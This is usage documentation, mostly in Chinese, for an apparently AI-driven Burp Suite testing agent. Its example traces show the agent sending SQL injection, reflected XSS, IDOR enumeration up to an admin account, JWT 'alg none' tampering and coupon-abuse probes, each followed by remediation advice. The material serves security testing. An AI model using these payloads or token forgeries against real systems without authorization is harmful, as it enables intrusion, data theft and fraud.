# 使用示例 (Examples)

本文档提供了 BurpAI Agent 的实际使用场景和示例。

## 目录

1. [SQL 注入检测示例](#sql-注入检测示例)
2. [XSS 检测示例](#xss-检测示例)
3. [IDOR 检测示例](#idor-检测示例)
4. [自定义 Prompt 示例](#自定义-prompt-示例)
5. [完整思维链示例](#完整思维链示例)

---

## SQL 注入检测示例

### 场景
测试一个用户查询接口，怀疑存在 SQL 注入漏洞。

### 原始请求
```http
GET /api/user?id=1001 HTTP/1.1
Host: vulnerable-app.com
User-Agent: Mozilla/5.0
Cookie: session=abc123
```

### AI Agent 执行过程

#### 第 1 轮: 初始分析
**AI Thought:**
```
The 'id' parameter appears to be numeric and directly embedded in the URL query.
This is a common injection point. I will test for error-based SQL injection
by appending a single quote to trigger a syntax error.
```

**System Action:**
```
Sending Request: GET /api/user?id=1001' HTTP/1.1
```

**Observation:**
```
Status Code: 500 Internal Server Error
Response Time: 245ms
Content-Type: application/json

Response Body:
{
  "error": "Database error: You have an error in your SQL syntax; 
   check the manual that corresponds to your MySQL server version 
   for the right syntax to use near '1001'' at line 1"
}
```

#### 第 2 轮: 确认注入类型
**AI Thought:**
```
Confirmed SQL injection vulnerability. The error message reveals MySQL database.
Now I will test boolean-based blind injection to verify data extraction capability.
```

**System Action:**
```
Sending Request: GET /api/user?id=1001 AND 1=1-- HTTP/1.1
```

**Observation:**
```
Status Code: 200 OK
Content-Length: 523
Response contains user data for ID 1001
```

#### 第 3 轮: 进一步验证
**AI Thought:**
```
The TRUE condition (1=1) returned normal data. Testing FALSE condition.
```

**System Action:**
```
Sending Request: GET /api/user?id=1001 AND 1=2-- HTTP/1.1
```

**Observation:**
```
Status Code: 200 OK
Content-Length: 89
Response: {"error": "User not found"}
```

#### 最终结论
**Result:**
```json
{
  "thought": "Boolean-based SQL injection confirmed. True/false conditions produce different responses.",
  "action": "finish",
  "vulnerability_found": true,
  "vulnerability_type": "SQL Injection (Boolean-based Blind)",
  "severity": "High",
  "evidence": "Error-based: MySQL syntax error with payload id=1001'\nBoolean-based: Different responses for 1=1 vs 1=2",
  "remediation": "Use parameterized queries (prepared statements) to prevent SQL injection. Example: SELECT * FROM users WHERE id = ?"
}
```

---

## XSS 检测示例

### 场景
测试搜索功能，检查是否存在反射型 XSS。

### 原始请求
```http
GET /search?q=test HTTP/1.1
Host: example.com
```

### AI Agent 执行过程

#### 第 1 轮: 基础测试
**AI Thought:**
```
The 'q' parameter is reflected in the HTML response. Testing with a basic
XSS payload to check if input is properly encoded.
```

**System Action:**
```
Sending Request: GET /search?q=<script>alert(1)</script> HTTP/1.1
```

**Observation:**
```
Status Code: 200 OK
Content-Type: text/html

Response Body:
<html>
<body>
  <h1>Search Results for: <script>alert(1)</script></h1>
  <p>No results found.</p>
</body>
</html>
```

#### 第 2 轮: 确认执行
**AI Thought:**
```
The payload is reflected without encoding! This confirms XSS vulnerability.
Let me verify with an event handler-based payload.
```

**System Action:**
```
Sending Request: GET /search?q=<img src=x onerror=alert(1)> HTTP/1.1
```

**Observation:**
```
Status Code: 200 OK

Response Body:
<h1>Search Results for: <img src=x onerror=alert(1)></h1>
```

#### 最终结论
**Result:**
```json
{
  "thought": "Reflected XSS confirmed. User input is directly embedded in HTML without sanitization.",
  "action": "finish",
  "vulnerability_found": true,
  "vulnerability_type": "Cross-Site Scripting (Reflected)",
  "severity": "High",
  "evidence": "Payload '<script>alert(1)</script>' reflected in HTML without encoding. Alternative payload '<img src=x onerror=alert(1)>' also works.",
  "remediation": "Implement proper output encoding. Use HTML entity encoding for all user inputs displayed in HTML context. Consider using Content-Security-Policy headers."
}
```

---

## IDOR 检测示例

### 场景
测试用户资料查看接口，检查是否存在越权访问。

### 原始请求
```http
GET /api/profile?userId=1001 HTTP/1.1
Host: example.com
Cookie: session=user1001_session
```

### AI Agent 执行过程

#### 第 1 轮: 建立基线
**AI Thought:**
```
The 'userId' parameter is sequential. First, I need to establish the baseline
by checking what data the current user (1001) should see.
```

**System Action:**
```
Sending Request: GET /api/profile?userId=1001 HTTP/1.1
```

**Observation:**
```
Status Code: 200 OK

Response:
{
  "userId": 1001,
  "email": "alice@example.com",
  "phone": "555-0101",
  "role": "user"
}
```

#### 第 2 轮: 测试越权
**AI Thought:**
```
Now testing if we can access another user's data by changing userId to 1002.
```

**System Action:**
```
Sending Request: GET /api/profile?userId=1002 HTTP/1.1
```

**Observation:**
```
Status Code: 200 OK

Response:
{
  "userId": 1002,
  "email": "bob@example.com",
  "phone": "555-0102",
  "role": "user"
}
```

#### 第 3 轮: 尝试管理员账户
**AI Thought:**
```
IDOR confirmed. Let me try accessing a potentially privileged user (ID 1).
```

**System Action:**
```
Sending Request: GET /api/profile?userId=1 HTTP/1.1
```

**Observation:**
```
Status Code: 200 OK

Response:
{
  "userId": 1,
  "email": "admin@example.com",
  "phone": "555-0001",
  "role": "admin"
}
```

#### 最终结论
**Result:**
```json
{
  "thought": "Critical IDOR vulnerability confirmed. Authenticated as user 1001, but successfully accessed user 1002, and even admin account (userId=1).",
  "action": "finish",
  "vulnerability_found": true,
  "vulnerability_type": "IDOR (Insecure Direct Object Reference)",
  "severity": "Critical",
  "evidence": "Successfully accessed:\n- User 1002 data (bob@example.com)\n- Admin data (admin@example.com, role: admin)\nNo authorization checks are performed.",
  "remediation": "Implement proper authorization checks:\n1. Verify the authenticated user has permission to access the requested resource\n2. Use indirect object references (e.g., encrypted IDs)\n3. Implement access control lists (ACL)"
}
```

---

## 自定义 Prompt 示例

### 场景 1: 分析加密参数
**用户输入:**
```
这个请求中的 'token' 参数看起来是 Base64 编码的，帮我分析一下它的结构，
看看能否伪造或篡改。
```

**原始请求:**
```http
POST /api/transfer HTTP/1.1
Content-Type: application/json

{
  "token": "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VySWQiOjEwMDEsImFtb3VudCI6MTAwfQ.",
  "recipient": "user1002"
}
```

**AI 分析过程:**
```
Iteration 1:
Thought: The token appears to be a JWT (JSON Web Token). Decoding the Base64 reveals:
  Header: {"alg":"none","typ":"JWT"}
  Payload: {"userId":1001,"amount":100}
  
Notice the algorithm is "none", which means no signature verification!

Action: Testing with modified payload (amount changed to 99999)
```

### 场景 2: 业务逻辑测试
**用户输入:**
```
测试一下这个优惠券接口，看看能不能重复使用或者绕过限制。
```

**AI 分析过程:**
```
Iteration 1:
Thought: Testing if the same coupon code can be applied multiple times

Action: Sending the same coupon application request twice

Iteration 2:
Thought: The second application was successful! Testing negative amount to see 
if we can get refund by "using" a coupon.
```

---

## 完整思维链示例

### Dashboard 展示效果

```
┌─────────────────────────────────────────────────────┐
│ Task #1234: GET /api/user?id=1001                   │
│ Status: Finished | Vulnerability: SQL Injection      │
└─────────────────────────────────────────────────────┘

Chat View:
───────────────────────────────────────────────────────

🟢 AI Thought [00:00.123]
"The 'id' parameter appears to be numeric. Testing for 
error-based SQL injection with single quote."

🔵 System Action [00:00.245]
Sending: GET /api/user?id=1001'

🟠 Observation [00:01.567]
Status: 500 Internal Server Error
Evidence: MySQL syntax error detected in response

🟢 AI Thought [00:01.890]
"Confirmed SQL injection. Testing boolean-based blind 
injection for data extraction capability."

🔵 System Action [00:02.012]
Sending: GET /api/user?id=1001 AND 1=1--

🟠 Observation [00:02.334]
Status: 200 OK
Response: User data returned (523 bytes)

🟢 AI Thought [00:02.456]
"TRUE condition works. Testing FALSE condition."

🔵 System Action [00:02.578]
Sending: GET /api/user?id=1001 AND 1=2--

🟠 Observation [00:02.890]
Status: 200 OK
Response: "User not found" (89 bytes)

🔴 VULNERABILITY FOUND [00:03.012]
Type: SQL Injection (Boolean-based Blind)
Severity: High
Evidence: Different responses for true/false conditions
Iterations: 3
Time: 3.012s
```

---

## 实用技巧

### 1. 快速扫描已知漏洞
在 Repeater 中右键选择 **"Specific: SQL Injection"**，只针对特定漏洞类型扫描，节省时间。

### 2. 批量测试相似接口
使用 Proxy 被动监听模式，浏览网站时自动捕获并测试所有符合条件的请求。

### 3. 自定义 Confidence Level
- **Low**: 更激进，可能误报，但不遗漏
- **High**: 更保守，只报告高置信度漏洞

### 4. 导出报告
完成扫描后，在 Dashboard 中右键任务 -> **Export Report** -> 选择格式（JSON/HTML）。

### 5. 查看原始对话
点击任务详情 -> **View Raw Conversation** 可以看到完整的 LLM 对话记录，用于调试。

---

## 常见问题

### Q: 为什么 AI 没有发现已知的漏洞?
**A**: 可能原因:
- Max Iterations 设置过低（建议至少 5 次）
- Confidence Level 设置为 High，过于保守
- 响应体被截断，丢失了关键信息（尝试增大截断阈值）

### Q: 如何减少误报?
**A**: 
- 提高 Confidence Level 到 High
- 使用 Custom Prompt 提供更多上下文信息
- 在配置中启用 "Require Strong Evidence" 选项

### Q: 扫描速度太慢怎么办?
**A**:
- 减少 Max Iterations（如设置为 3）
- 使用更快的 LLM 模型（如 GPT-3.5-turbo）
- 优化 Scope 配置，减少不必要的扫描

---

## 下一步

- 查看 [API 协议规范](./API_PROTOCOL.md) 了解如何自定义 Prompt
- 查看 [系统架构设计](./ARCHITECTURE.md) 了解内部实现
- 加入社区讨论，分享您的使用经验
